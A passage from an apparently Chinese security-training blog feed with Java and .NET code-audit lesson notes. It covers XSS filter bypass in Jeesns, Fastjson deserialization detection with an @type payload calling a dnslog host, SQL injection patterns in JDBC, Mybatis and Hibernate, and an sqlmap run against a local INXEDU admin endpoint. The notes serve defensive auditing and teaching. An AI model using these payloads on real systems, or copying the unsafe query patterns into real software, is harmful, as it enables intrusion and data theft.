      
        <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、Java-配置-Filter过滤器</p><p>2、Java-配置-第三方框架组件</p><p>3、Java-代审计-XSS跨站&amp;框架组件</p><h3 id="Java审计知识点："><a href="#Java审计知识点：" class="headerlink" title="#Java审计知识点："></a>#Java审计知识点：</h3><p>SQL注入，XSS跨站，RCE执行，反序列化，身份验证，SPEL，SSTI，三方组件安全等</p><h3 id="章节点："><a href="#章节点：" class="headerlink" title="#章节点："></a>#章节点：</h3><p>1、语言审计-PHP&amp;.Net&amp;Java&amp;Python</p><p>2、漏洞审计-注入&amp;上传&amp;RCE&amp;未授权等</p><p>3、框架审计-ThinkPHP&amp;Spring&amp;Flask等</p><p>4、工具审计-RIPS&amp;VCG&amp;Fortify&amp;Bandit等</p><p>5、技术审计-动静态调试&amp;DAST&amp;SAST&amp;IAST等</p><blockquote><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><h4 id="➢-Demo-Filter-过滤器引用介绍"><a href="#➢-Demo-Filter-过滤器引用介绍" class="headerlink" title="➢ Demo-Filter-过滤器引用介绍"></a>➢ Demo-Filter-过滤器引用介绍</h4><h4 id="➢-Demo-St2框架-组件安全"><a href="#➢-Demo-St2框架-组件安全" class="headerlink" title="➢ Demo-St2框架-组件安全"></a>➢ Demo-St2框架-组件安全</h4><h4 id="➢-CNVD-Jeesns-XSS跨站绕过"><a href="#➢-CNVD-Jeesns-XSS跨站绕过" class="headerlink" title="➢ CNVD-Jeesns-XSS跨站绕过"></a>➢ CNVD-Jeesns-XSS跨站绕过</h4><h4 id="➢-CNVD-悟空CRM-Fastjson组件"><a href="#➢-CNVD-悟空CRM-Fastjson组件" class="headerlink" title="➢ CNVD-悟空CRM-Fastjson组件"></a>➢ CNVD-悟空CRM-Fastjson组件</h4></blockquote><h4 id="Demo-Filter-过滤器引用介绍"><a href="#Demo-Filter-过滤器引用介绍" class="headerlink" title="#Demo-Filter-过滤器引用介绍"></a>#Demo-Filter-过滤器引用介绍</h4><h6 id="web-xml："><a href="#web-xml：" class="headerlink" title="web.xml："></a>web.xml：</h6><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">​    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>xsscheck<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span>//名字</span><br><span class="line">​    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>com.anbai.sec.XssFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span>//class</span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">​    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>xsscheck<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span>//名字</span><br><span class="line">​    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>*.jsp<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span>//路由</span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="Demo-ST2框架-组件安全"><a href="#Demo-ST2框架-组件安全" class="headerlink" title="#Demo-ST2框架-组件安全"></a>#Demo-ST2框架-组件安全</h4><p>配置文件获取框架名称及版本，利用漏洞库验证是否存在漏洞</p><p>确定框架是否符合（名称和版本），结合网上给出的漏洞库进行判断</p><p><strong>查看配置文件web.xml和外部引用库，确定当前引用框架名称和版本</strong></p><p>Struts2 配置文件：struts.xml</p><p>Spring 配置文件：applicationContext.xml</p><p>Spring MVC 配置文件：spring-mvc.xml</p><p>Hibernate 配置文件：Hibernate.cfg.xml</p><p>Mybaits 配置文件：mybatis-config.xml</p><h4 id="CNVD-Jeesns-XSS跨站绕过"><a href="#CNVD-Jeesns-XSS跨站绕过" class="headerlink" title="#CNVD-Jeesns-XSS跨站绕过"></a>#CNVD-Jeesns-XSS跨站绕过</h4><p><code>error?msg=&lt;Script&gt;prompt(/xss/)&lt;/Script&gt;</code>  用prompt替代alert</p><h4 id="CNVD-悟空CRM-Fastjson组件"><a href="#CNVD-悟空CRM-Fastjson组件" class="headerlink" title="#CNVD-悟空CRM-Fastjson组件"></a>#CNVD-悟空CRM-Fastjson组件</h4><p><a href="https://blog.csdn.net/weixin_43873557/article/details/113732612">(23条消息) Fastjson漏洞_低头观自在的博客-CSDN博客</a></p><p><a href="https://cloud.tencent.com/developer/article/1957185">浅析FastJSON反序列化漏洞（1.2.24——1.2.68） - 腾讯云开发者社区-腾讯云 (tencent.com)</a></p><p>POST请求：{“@type”:”java.net.Inet4Address”,”val”:”0xibeu.dnslog.cn”}</p><p><a href="https://blog.csdn.net/weixin_56039103/article/details/116737764">https://blog.csdn.net/weixin_56039103/article/details/116737764</a></p><h6 id="在pom-xml里面查看"><a href="#在pom-xml里面查看" class="headerlink" title="在pom.xml里面查看"></a>在pom.xml里面查看</h6><p><img src="/../images/Day90-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-Filter%E8%BF%87%E6%BB%A4%E5%99%A8-CNVD%E5%88%86%E6%9E%90-XSS%E8%B7%A8%E7%AB%99-%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/image-20230411154828605.png" alt="image-20230411154828605"></p><h6 id="怎么找Fastjson漏洞"><a href="#怎么找Fastjson漏洞" class="headerlink" title="怎么找Fastjson漏洞?"></a>怎么找Fastjson漏洞?</h6><h6 id="源码中找Fastjson使用最多的方法"><a href="#源码中找Fastjson使用最多的方法" class="headerlink" title="源码中找Fastjson使用最多的方法"></a>源码中找Fastjson使用最多的方法</h6><p><img src="/../images/Day90-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-Filter%E8%BF%87%E6%BB%A4%E5%99%A8-CNVD%E5%88%86%E6%9E%90-XSS%E8%B7%A8%E7%AB%99-%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/image-20230411153643809.png" alt="image-20230411153643809"></p><h6 id="搜索结果里面有"><a href="#搜索结果里面有" class="headerlink" title="搜索结果里面有"></a>搜索结果里面有</h6><p><img src="/../images/Day90-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-Filter%E8%BF%87%E6%BB%A4%E5%99%A8-CNVD%E5%88%86%E6%9E%90-XSS%E8%B7%A8%E7%AB%99-%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/image-20230411153802046.png" alt="image-20230411153802046"></p><h6 id="找到这处"><a href="#找到这处" class="headerlink" title="找到这处"></a>找到这处</h6><p><img src="/../images/Day90-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-Filter%E8%BF%87%E6%BB%A4%E5%99%A8-CNVD%E5%88%86%E6%9E%90-XSS%E8%B7%A8%E7%AB%99-%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/image-20230411154026411.png" alt="image-20230411154026411"></p><h6 id="找到引用的地方"><a href="#找到引用的地方" class="headerlink" title="找到引用的地方"></a>找到引用的地方</h6><p><img src="/../images/Day90-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-Filter%E8%BF%87%E6%BB%A4%E5%99%A8-CNVD%E5%88%86%E6%9E%90-XSS%E8%B7%A8%E7%AB%99-%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/image-20230411154101207.png" alt="image-20230411154101207"></p><h6 id="post测试回显的payload"><a href="#post测试回显的payload" class="headerlink" title="post测试回显的payload"></a>post测试回显的payload</h6><p><img src="/../images/Day90-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-Filter%E8%BF%87%E6%BB%A4%E5%99%A8-CNVD%E5%88%86%E6%9E%90-XSS%E8%B7%A8%E7%AB%99-%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/image-20230411154241379.png" alt="image-20230411154241379"></p><p><img src="/../images/Day90-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-Filter%E8%BF%87%E6%BB%A4%E5%99%A8-CNVD%E5%88%86%E6%9E%90-XSS%E8%B7%A8%E7%AB%99-%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/image-20230411154520379.png" alt="image-20230411154520379"></p><h6 id="抓包将接收格式改为上面代码里面要求的格式"><a href="#抓包将接收格式改为上面代码里面要求的格式" class="headerlink" title="抓包将接收格式改为上面代码里面要求的格式"></a>抓包将接收格式改为上面代码里面要求的格式</h6><p><img src="/../images/Day90-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-Filter%E8%BF%87%E6%BB%A4%E5%99%A8-CNVD%E5%88%86%E6%9E%90-XSS%E8%B7%A8%E7%AB%99-%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/image-20230411154718859.png" alt="image-20230411154718859"></p><h6 id="发送回显成功"><a href="#发送回显成功" class="headerlink" title="发送回显成功"></a>发送回显成功</h6><p><img src="/../images/Day90-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-Filter%E8%BF%87%E6%BB%A4%E5%99%A8-CNVD%E5%88%86%E6%9E%90-XSS%E8%B7%A8%E7%AB%99-%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/image-20230411154627097.png" alt="image-20230411154627097"></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Day89 代码审计-Java项目&amp;JDBC&amp;Mybatis&amp;Hibernate&amp;注入&amp;预编译&amp;写法</title>
      <link href="/2023/04/11/Day89-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-JDBC-Mybatis-Hibernate-%E6%B3%A8%E5%85%A5-%E9%A2%84%E7%BC%96%E8%AF%91-%E5%86%99%E6%B3%95/"/>
      <url>/2023/04/11/Day89-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-JDBC-Mybatis-Hibernate-%E6%B3%A8%E5%85%A5-%E9%A2%84%E7%BC%96%E8%AF%91-%E5%86%99%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、Java-数据库-JDBC&amp;Mybatis&amp;Hibernate</p><p>2、Java-SQL注入-预编译&amp;安全写法&amp;查询方式</p><p>3、Java-代码审计-SQL注入&amp;Mybatis&amp;追踪调用</p><h3 id="Java审计知识点："><a href="#Java审计知识点：" class="headerlink" title="#Java审计知识点："></a>#Java审计知识点：</h3><p>SQL注入，XSS跨站，RCE执行，反序列化，身份验证，SPEL，SSTI，三方组件安全等</p><h3 id="章节点："><a href="#章节点：" class="headerlink" title="#章节点："></a>#章节点：</h3><p>1、语言审计-PHP&amp;.Net&amp;Java&amp;Python</p><p>2、漏洞审计-注入&amp;上传&amp;RCE&amp;未授权等</p><p>3、框架审计-ThinkPHP&amp;Spring&amp;Flask等</p><p>4、工具审计-RIPS&amp;VCG&amp;Fortify&amp;Bandit等</p><p>5、技术审计-动静态调试&amp;DAST&amp;SAST&amp;IAST等</p><h3 id="简要点："><a href="#简要点：" class="headerlink" title="#简要点："></a>#简要点：</h3><p>1、代码审计必备知识点：</p><p>环境搭建使用，工具插件安装使用，掌握各种漏洞原理及利用,代码开发类知识点。</p><p>2、代码审计开始前准备：</p><p>审计目标的程序名，版本，当前环境(系统,中间件,脚本语言等信息),各种插件等。</p><p>3、代码审计挖掘漏洞根本：</p><p>可控变量及特定函数，不存在过滤或过滤不严谨存在绕过导致的安全漏洞。</p><p>4、代码审计教学计划：</p><p>审计项目漏洞原理-&gt;审计思路-&gt;完整源码-&gt;应用框架-&gt;验证并利用漏洞。</p><p>5、代码审计教学内容：</p><p>PHP,Java,.NET,Python网站应用，引入框架类开发源码，相关审计工具及插件使用。</p><blockquote><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><h4 id="➢-Javaweb-数据库操作-模式-amp-写法-amp-预编译等"><a href="#➢-Javaweb-数据库操作-模式-amp-写法-amp-预编译等" class="headerlink" title="➢ Javaweb-数据库操作-模式&amp;写法&amp;预编译等"></a>➢ Javaweb-数据库操作-模式&amp;写法&amp;预编译等</h4><h4 id="➢-Javaweb-代码审计SQL注入-INXEDU在线网校"><a href="#➢-Javaweb-代码审计SQL注入-INXEDU在线网校" class="headerlink" title="➢ Javaweb-代码审计SQL注入-INXEDU在线网校"></a>➢ Javaweb-代码审计SQL注入-INXEDU在线网校</h4></blockquote><h3 id="Javaweb-数据库操作-模式-amp-写法-amp-预编译等"><a href="#Javaweb-数据库操作-模式-amp-写法-amp-预编译等" class="headerlink" title="#Javaweb-数据库操作-模式&amp;写法&amp;预编译等"></a>#Javaweb-数据库操作-模式&amp;写法&amp;预编译等</h3><p>在Java中执行SQL语句一般有以下几种方式：</p><h5 id="JDBC-注入分析"><a href="#JDBC-注入分析" class="headerlink" title="-JDBC 注入分析"></a>-JDBC 注入分析</h5><h6 id="安全写法（SQLDemo3）：-“select-from-user-where-id-x3D-”"><a href="#安全写法（SQLDemo3）：-“select-from-user-where-id-x3D-”" class="headerlink" title="安全写法（SQLDemo3）： “select * from user where id &#x3D; ?”;"></a>安全写法（SQLDemo3）： “select * from user where id &#x3D; ?”;</h6><p><img src="/../images/Day89-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-JDBC-Mybatis-Hibernate-%E6%B3%A8%E5%85%A5-%E9%A2%84%E7%BC%96%E8%AF%91-%E5%86%99%E6%B3%95/image-20230411124735846.png" alt="image-20230411124735846"></p><h6 id="不安全写法（SQLDemo）：-“select-from-user-where-id-x3D-”-req-getParameter-“id”"><a href="#不安全写法（SQLDemo）：-“select-from-user-where-id-x3D-”-req-getParameter-“id”" class="headerlink" title="不安全写法（SQLDemo）： “select * from user where id &#x3D;”+req.getParameter(“id”);"></a>不安全写法（SQLDemo）： “select * from user where id &#x3D;”+req.getParameter(“id”);</h6><p><img src="/../images/Day89-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-JDBC-Mybatis-Hibernate-%E6%B3%A8%E5%85%A5-%E9%A2%84%E7%BC%96%E8%AF%91-%E5%86%99%E6%B3%95/image-20230411124903745.png" alt="image-20230411124903745"></p><h6 id="不安全写法（SQLDemo2）：即使采用了预编译prepareStatement"><a href="#不安全写法（SQLDemo2）：即使采用了预编译prepareStatement" class="headerlink" title="不安全写法（SQLDemo2）：即使采用了预编译prepareStatement"></a>不安全写法（SQLDemo2）：即使采用了预编译prepareStatement</h6><p><img src="/../images/Day89-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-JDBC-Mybatis-Hibernate-%E6%B3%A8%E5%85%A5-%E9%A2%84%E7%BC%96%E8%AF%91-%E5%86%99%E6%B3%95/image-20230411124948769.png" alt="image-20230411124948769"></p><h5 id="Mybatis-注入分析"><a href="#Mybatis-注入分析" class="headerlink" title="-Mybatis 注入分析"></a>-Mybatis 注入分析</h5><p><img src="/../images/Day89-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-JDBC-Mybatis-Hibernate-%E6%B3%A8%E5%85%A5-%E9%A2%84%E7%BC%96%E8%AF%91-%E5%86%99%E6%B3%95/image-20230411132106217.png" alt="image-20230411132106217"></p><blockquote><p><strong>#号</strong>会对语句进行预编译</p><p><strong>${ }</strong> 只是进行string 替换，动态解析SQL的时候会进行变量替换</p></blockquote><p>安全写法（）： select *  from user where name &#x3D; #{name}</p><p>不安全写法（UserDao.xml）：select *  from user where name &#x3D; ${name}            </p><h5 id="Hibernate-注入分析"><a href="#Hibernate-注入分析" class="headerlink" title="-Hibernate 注入分析"></a>-Hibernate 注入分析</h5><h6 id="安全写法（）：参数绑定预编译"><a href="#安全写法（）：参数绑定预编译" class="headerlink" title="安全写法（）：参数绑定预编译"></a>安全写法（）：参数绑定预编译</h6><p><code>Query&lt;User&gt;.query=session.createNativeQuery(&quot;select * from user  where name=:name&quot;);</code></p><p><code>query.setParameter(&quot;name&quot;,parameter) ;</code></p><h6 id="不安全写法（User-java）："><a href="#不安全写法（User-java）：" class="headerlink" title="不安全写法（User.java）："></a>不安全写法（User.java）：</h6><p><code>Query&lt;User&gt;.query=session.createNativeQuery(&quot;select * from user  where name=&quot;+req.getParameter(&quot;id&quot;));</code></p><p>总结：</p><h6 id="1、预编译使用不当："><a href="#1、预编译使用不当：" class="headerlink" title="1、预编译使用不当："></a>1、预编译使用不当：</h6><p>前一句预编译了，又来一句拼接语句and…，后面的可以注入</p><p>sql&#x3D;”select * from user where id &#x3D; ?”;</p><p>sql+&#x3D;”and username &#x3D;”+req.getParameter(“username”);</p><h6 id="2、直接动态拼接："><a href="#2、直接动态拼接：" class="headerlink" title="2、直接动态拼接："></a>2、直接动态拼接：</h6><p> “select * from user where id &#x3D;”+req.getParameter(“id”);</p><h6 id="3、order-by-amp-like-amp-in查询：-由于这三种不能预编译，所以需要过滤器或自定义过滤"><a href="#3、order-by-amp-like-amp-in查询：-由于这三种不能预编译，所以需要过滤器或自定义过滤" class="headerlink" title="3、order by&amp;like&amp;in查询：(由于这三种不能预编译，所以需要过滤器或自定义过滤)"></a>3、order by&amp;like&amp;in查询：(由于这三种不能预编译，所以需要过滤器或自定义过滤)</h6><p>防御：</p><p>能预编译的情况都做预编译，一些特殊无法做预编译的，则过滤用户可控的参数。</p><h3 id="Javaweb-代码审计SQL注入-INXEDU在线网校"><a href="#Javaweb-代码审计SQL注入-INXEDU在线网校" class="headerlink" title="#Javaweb-代码审计SQL注入-INXEDU在线网校"></a>#Javaweb-代码审计SQL注入-INXEDU在线网校</h3><h5 id="明确SQL三种模式-gt-引用Mybatis-gt-写法及XML文件-gt-deleteArticleByIds-gt-ArticleService-java-gt-调用层次结构-gt-deleteArticle-gt-this-deleteArticle-aridArr"><a href="#明确SQL三种模式-gt-引用Mybatis-gt-写法及XML文件-gt-deleteArticleByIds-gt-ArticleService-java-gt-调用层次结构-gt-deleteArticle-gt-this-deleteArticle-aridArr" class="headerlink" title="明确SQL三种模式-&gt;引用Mybatis-&gt;$()写法及XML文件-&gt;deleteArticleByIds-&gt;ArticleService.java-&gt;调用层次结构-&gt;deleteArticle-&gt;this.deleteArticle(aridArr)"></a>明确SQL三种模式-&gt;引用Mybatis-&gt;$()写法及XML文件-&gt;deleteArticleByIds-&gt;ArticleService.java-&gt;调用层次结构-&gt;deleteArticle-&gt;this.deleteArticle(aridArr)</h5><h6 id="路由：-x2F-admin-x2F-article-x2F-delete-参数：articelId"><a href="#路由：-x2F-admin-x2F-article-x2F-delete-参数：articelId" class="headerlink" title="路由：&#x2F;admin&#x2F;article&#x2F;delete 参数：articelId"></a>路由：&#x2F;admin&#x2F;article&#x2F;delete 参数：articelId</h6><h6 id="python-sqlmap-py-r-inxedu-txt"><a href="#python-sqlmap-py-r-inxedu-txt" class="headerlink" title="python sqlmap.py -r inxedu.txt"></a>python sqlmap.py -r inxedu.txt</h6><h6 id="数据包："><a href="#数据包：" class="headerlink" title="数据包："></a>数据包：</h6><p><code>POST /admin/article/delete HTTP/1.1</code><br><code>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</code><br><code>Accept-Encoding: gzip, deflate, br</code><br><code>Accept-Language: zh-CN,zh;q=0.9</code><br><code>Cache-Control: max-age=0</code><br><code>Connection: keep-alive</code><br><code>Cookie: BEEFHOOK=AOWdyRnbQnsrIpDhPuZf0a8oGzFzUKJrfRgGVHbRCB8cvznVuMjwWpmCPpPZuQyYjmiKPdtWLQJWbF80; _c_id=ascxsky7fw6uja985fn1635787683950vota; 3AB9D23F7A4B3C9B=YRQ5UHLXN2L3Z6RWJYHZNC3APNTMAJZNYXER2ILC6Z6TLFUDUAWZ4TLJA54Q37AMAKWGGT4LWNSNWYAUH6UJWZU74E; jSkQ_2132_ulastactivity=dcc8oerh%2F%2BcUSRVNiDd1%2B3wanKhoUM6O1jjHGfOa8wi1oDWf7zW5; jSkQ_2132_lastcheckfeed=1%7C1638707571; jSkQ_2132_nofavfid=1; JSESSIONID=12705DA8E13D05312443DE7F337F512F; inxedulogin_sys_user_=inxedulogin_sys_user_1</code><br><code>Host: 127.0.0.1:8080</code><br><code>Sec-Fetch-Dest: document</code><br><code>Sec-Fetch-Mode: navigate</code><br><code>Sec-Fetch-Site: none</code><br><code>Sec-Fetch-User: ?1</code><br><code>Upgrade-Insecure-Requests: 1</code><br><code>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36</code><br><code>sec-ch-ua: &quot; Not A;Brand&quot;;v=&quot;99&quot;, &quot;Chromium&quot;;v=&quot;101&quot;, &quot;Google Chrome&quot;;v=&quot;101&quot;</code><br><code>sec-ch-ua-mobile: ?0</code><br><code>sec-ch-ua-platform: &quot;Windows&quot;</code></p><p><code>articelId=1*</code></p><h6 id="审计过程："><a href="#审计过程：" class="headerlink" title="审计过程："></a>审计过程：</h6><h6 id="搜索-，找到所在的xml文件"><a href="#搜索-，找到所在的xml文件" class="headerlink" title="搜索$()，找到所在的xml文件"></a>搜索$()，找到所在的xml文件</h6><p><img src="/../images/Day89-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-JDBC-Mybatis-Hibernate-%E6%B3%A8%E5%85%A5-%E9%A2%84%E7%BC%96%E8%AF%91-%E5%86%99%E6%B3%95/image-20230411134842706.png" alt="image-20230411134842706"></p><h6 id="找到上面id对应的DAO层文件"><a href="#找到上面id对应的DAO层文件" class="headerlink" title="找到上面id对应的DAO层文件"></a>找到上面id对应的DAO层文件</h6><p><img src="/../images/Day89-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-JDBC-Mybatis-Hibernate-%E6%B3%A8%E5%85%A5-%E9%A2%84%E7%BC%96%E8%AF%91-%E5%86%99%E6%B3%95/image-20230411135159882.png" alt="image-20230411135159882"></p><h6 id="打开选中这个方法"><a href="#打开选中这个方法" class="headerlink" title="打开选中这个方法"></a>打开选中这个方法</h6><p><img src="/../images/Day89-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-JDBC-Mybatis-Hibernate-%E6%B3%A8%E5%85%A5-%E9%A2%84%E7%BC%96%E8%AF%91-%E5%86%99%E6%B3%95/image-20230411135349881.png" alt="image-20230411135349881"></p><h6 id="打开右边的方法层次，实现功能的都是最后一层，所以直接打开最后一层即可，找打对应的参数"><a href="#打开右边的方法层次，实现功能的都是最后一层，所以直接打开最后一层即可，找打对应的参数" class="headerlink" title="打开右边的方法层次，实现功能的都是最后一层，所以直接打开最后一层即可，找打对应的参数"></a>打开右边的方法层次，实现功能的都是最后一层，所以直接打开最后一层即可，找打对应的参数</h6><p><img src="/../images/Day89-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-JDBC-Mybatis-Hibernate-%E6%B3%A8%E5%85%A5-%E9%A2%84%E7%BC%96%E8%AF%91-%E5%86%99%E6%B3%95/image-20230411135606249.png" alt="image-20230411135606249"></p><h6 id="可以翻到最上面看到路由地址，所以路由：-x2F-admin-x2F-article-x2F-delete-参数：articelId"><a href="#可以翻到最上面看到路由地址，所以路由：-x2F-admin-x2F-article-x2F-delete-参数：articelId" class="headerlink" title="可以翻到最上面看到路由地址，所以路由：&#x2F;admin&#x2F;article&#x2F;delete 参数：articelId"></a>可以翻到最上面看到路由地址，所以路由：&#x2F;admin&#x2F;article&#x2F;delete 参数：articelId</h6><p><img src="/../images/Day89-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-JDBC-Mybatis-Hibernate-%E6%B3%A8%E5%85%A5-%E9%A2%84%E7%BC%96%E8%AF%91-%E5%86%99%E6%B3%95/image-20230411140134296.png" alt="image-20230411140134296"></p><h6 id="构造上面的数据包，用sqlmap跑，同时可以监控数据库语句查看注入成功的语句"><a href="#构造上面的数据包，用sqlmap跑，同时可以监控数据库语句查看注入成功的语句" class="headerlink" title="构造上面的数据包，用sqlmap跑，同时可以监控数据库语句查看注入成功的语句"></a>构造上面的数据包，用sqlmap跑，同时可以监控数据库语句查看注入成功的语句</h6><p><img src="/../images/Day89-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-JDBC-Mybatis-Hibernate-%E6%B3%A8%E5%85%A5-%E9%A2%84%E7%BC%96%E8%AF%91-%E5%86%99%E6%B3%95/image-20230411140456382.png" alt="image-20230411140456382"></p><h6 id="如果有-这种注入不了的话，那么就可能是由内置的过滤器过滤规则，路由后面会有这种"><a href="#如果有-这种注入不了的话，那么就可能是由内置的过滤器过滤规则，路由后面会有这种" class="headerlink" title="如果有$()这种注入不了的话，那么就可能是由内置的过滤器过滤规则，路由后面会有这种{}"></a>如果有$()这种注入不了的话，那么就可能是由内置的过滤器过滤规则，路由后面会有这种{}</h6><p><img src="/../images/Day89-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Java%E9%A1%B9%E7%9B%AE-JDBC-Mybatis-Hibernate-%E6%B3%A8%E5%85%A5-%E9%A2%84%E7%BC%96%E8%AF%91-%E5%86%99%E6%B3%95/image-20230411142540386.png" alt="image-20230411142540386"></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Day88 代码审计-NET项目&amp;DLL反编译&amp;未授权访问&amp;脆弱验证&amp;注入&amp;上传</title>
      <link href="/2023/03/26/Day88-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-NET%E9%A1%B9%E7%9B%AE-DLL%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81-%E6%B3%A8%E5%85%A5-%E4%B8%8A%E4%BC%A0/"/>
      <url>/2023/03/26/Day88-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-NET%E9%A1%B9%E7%9B%AE-DLL%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81-%E6%B3%A8%E5%85%A5-%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<p><img src="/../images/Day88-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-NET%E9%A1%B9%E7%9B%AE-DLL%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81-%E6%B3%A8%E5%85%A5-%E4%B8%8A%E4%BC%A0/a9_Qhi7RJlF56da_4f0gBg.png" alt="img"></p><p><img src="/../images/Day88-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-NET%E9%A1%B9%E7%9B%AE-DLL%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81-%E6%B3%A8%E5%85%A5-%E4%B8%8A%E4%BC%A0/FxqWdrZUvsy_pUxJ78NDjQ.png" alt="img"></p><h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、NET普通源码&amp;编译源码</p><p>2、DLL反编译&amp;后缀文件&amp;指向</p><p>3、代码审计-SQL注入&amp;未授权访问</p><p>ASPX文件-&gt;CS ASPX.CS DLL反编译后寻找  看核心代码分析漏洞</p><p>CS ASPX.CS DLL反编译文件-&gt;ASPX文件寻找  确定漏洞进行调试测试</p><p>代码审计时要把这个反编译文件提取导入到IDE中  后期搜索关键字或函数挖掘</p><h3 id="详细点："><a href="#详细点：" class="headerlink" title="#详细点："></a>#详细点：</h3><h4 id="后缀解析："><a href="#后缀解析：" class="headerlink" title="后缀解析："></a>后缀解析：</h4><p>asp.net可以用C# ，VB.NET ，Jscript.net等等来开发，但是通常首选都是C#和VB.NET</p><p>审计asp.net的时候，首先得弄明白他的结构，他并不像php那么单纯。</p><p>一般来说，在asp.net应用中，需要进行观察的文件有：**.aspx，.cs，.ashx，dll**文件</p><blockquote><p>1、.aspx是页面后的代码，aspx负责显示，服务器端的动作就是在.cs定义的</p><p>2、.cs是类文件，公共类神马的就是这个了</p><p>3、.ashx是一般处理程序，主要用于写web handler,可以理解成不会显示的aspx页面</p><p>4、.dll就是cs文件编译之后的程序集</p></blockquote><h4 